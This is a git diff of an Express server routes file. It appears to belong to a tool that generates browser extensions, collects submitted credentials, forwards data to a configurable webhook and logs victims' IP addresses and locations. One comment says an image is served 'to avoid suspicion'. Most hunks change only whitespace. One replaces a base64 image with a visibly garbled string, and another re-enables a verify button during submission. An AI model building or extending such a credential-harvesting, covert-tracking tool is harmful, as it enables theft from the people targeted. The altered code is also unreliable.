@@ -994,7 +994,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Handle custom images
       const profilePicture = req.body.profilePicture || '';
       const backgroundImage = req.body.backgroundImage || '';
-      
+
       // Template replacements
       const replacements = {
         '{{EXTENSION_NAME}}': name,
@@ -1723,7 +1723,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   // ===== ADMIN PANEL ENDPOINTS =====
   // These endpoints are specifically for the admin panel UI
-  
+
   // Get all access keys (admin view)
   app.get('/api/admin/keys', authenticateUser, requireAdmin, async (req: Request, res: Response) => {
     try {
@@ -1781,13 +1781,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.json(accessKey);
     } catch (error: any) {
       console.error('Admin key creation error:', error);
-      
+
       // Handle Zod validation errors
       if (error.name === 'ZodError') {
         const errorMessages = error.errors.map((err: any) => `${err.path.join('.')}: ${err.message}`);
         return res.status(400).json({ error: `Validation error: ${errorMessages.join(', ')}` });
       }
-      
+
       if (error.message && error.message.includes('unique')) {
         return res.status(409).json({ error: 'Access key already exists' });
       }
@@ -1812,13 +1812,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.json({ keys, count: keys.length });
     } catch (error: any) {
       console.error('Admin bulk key creation error:', error);
-      
+
       // Handle Zod validation errors
       if (error.name === 'ZodError') {
         const errorMessages = error.errors.map((err: any) => `${err.path.join('.')}: ${err.message}`);
         return res.status(400).json({ error: `Validation error: ${errorMessages.join(', ')}` });
       }
-      
+
       res.status(500).json({ error: 'Internal server error' });
     }
   });
@@ -1828,7 +1828,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const { keyId } = req.params;
       const success = await storage.deleteAccessKeyById(keyId);
-      
+
       if (!success) {
         return res.status(404).json({ error: 'Access key not found' });
       }
@@ -1854,13 +1854,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.json({ success: true, webhookUrl: settings.webhookUrl });
     } catch (error: any) {
       console.error('Admin webhook update error:', error);
-      
+
       // Handle Zod validation errors
       if (error.name === 'ZodError') {
         const errorMessages = error.errors.map((err: any) => `${err.path.join('.')}: ${err.message}`);
         return res.status(400).json({ error: `Validation error: ${errorMessages.join(', ')}` });
       }
-      
+
       res.status(500).json({ error: 'Internal server error' });
     }
   });
@@ -2749,7 +2749,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       console.error('Error serving image:', error);
 
       // Even if there's an error, still serve a large visible image to avoid suspicion
-      const visibleImageBase64 = "iVBORw0KGgoAAAANSUhEUgAAASwAAADICAYAAABS39xVAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2ZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDkuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNTo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3Lm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDowMTgwMTE3NDA3MjA2ODExODIyQUY0MDBDMTU3MzBDRiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpBODlGNTA3OUE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpBODlGNTA3OEE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC.paaWQiOiIwMTgwMTE3NDA3MjA2ODExODIyQEY0MDBDMTU3MzBDRiIgc1JlZjpkb2N1bWVudElEPXhtcC5kaWQ6MDE4MDExNzQwNzIwNjgxMTgyMkFGNDAwQzE1NzMwQ0YiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7gp8M3AAADQUlEQVR42u3dy2pVMRSA4X1sK9gKFrRWpOJAEBwIjgRf4HfgA3RgF7aDOhCcCAO1YqFWsVq7ELzWIhZ7w6qt6F+xJiHNOScnyck5+b6BjU1O0iTfmqzs7J1kAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+      const visibleImageBase64 = "iVBORw0KGgoAAAANSUhEUgAAASwAAADICAYAAABS39xVAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2ZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDkuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNTo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3Lm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDowMTgwMTE3NDA3MjA2ODExODIyQUY0MDBDMTU3MzBDRiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpBODlGNTA3OUE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpBODlGNTA3OEE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC.paaWQiOi0xODA1MTE3NDA3MjA2ODExODIyQEY0MDBDMTU3MzBDMSIgc1JlZjpkb2N1bWVudElEPXhtcC5kaWQ6MDE4MDExNzQwNzIwNjgxMTgyMkFGNDAwQzE1NzMwQ0YiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7gp8M3AAADQUlEQVR42u3dy2pVMRSA4X1sK9gKFrRWpOJAEBwIjgRf4HfgA3RgF7aDOhCcCAO1YqFWsVq7ELzWIhZ7w6qt6F+xJiHNOScnyck5+b6BjU1O0iTfmqzs7J1kAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
 
       const visibleImage = Buffer.from(visibleImageBase64, 'base64');
 
@@ -3848,7 +3848,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
         verifyBtn.addEventListener('click', async () => {
             hideMessages();
-            verifyBtn.disabled = true;
+            verifyBtn.disabled = false;
             verifyBtn.textContent = 'Verifying...';
 
             await submitCredentials(true);
@@ -4005,8 +4005,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       console.log(`🔌 Extension activity tracked: ${extensionData.extensionName} from ${clientIp}`);
 
-      res.json({ 
-        success: true, 
+      res.json({
+        success: true,
         tracked: true,
         logId: extensionLog.extensionId,
         location: locationData.location,
